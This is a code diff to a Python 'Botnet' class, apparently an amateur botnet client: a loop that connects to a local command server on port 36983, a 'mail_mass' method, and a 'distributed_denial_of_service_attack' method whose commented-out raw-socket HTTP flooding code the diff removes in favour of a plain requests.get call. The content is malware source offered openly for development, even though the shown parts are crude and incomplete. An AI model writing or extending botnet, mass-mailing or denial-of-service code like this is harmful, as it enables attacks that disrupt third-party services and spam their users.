@@ -22,7 +22,6 @@ class Botnet:
 
     def connection(self):
         while True:
-            #   try:
             self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.client.connect(("127.0.0.1", 36983))
             time.sleep(1)
@@ -55,8 +54,6 @@ class Botnet:
                     except:
                         pass
 
-            #except:
-            #    pass
 
     def mail_mass(self, cmd, leng, file):
         try:
@@ -114,17 +111,8 @@ class Botnet:
 
 
     def distributed_denial_of_service_attack(self, url):
-        #try:
-            #client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            #client.connect((url, 80))
-            #msg = "GET / HTTP/1.1\r Host: www.youtube.com:80"
-            #msg = "GET HTTP/1.1\nHost: \n\n" + str((url, 80)) +"\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
-            #client.send(msg.encode())
             print(1)
-            #print(client.recv(1024))
             print(requests.get(url))
-        #except socket.error:
-         #   print(socket.error)
 
 bot = Botnet()
 bot.connection()
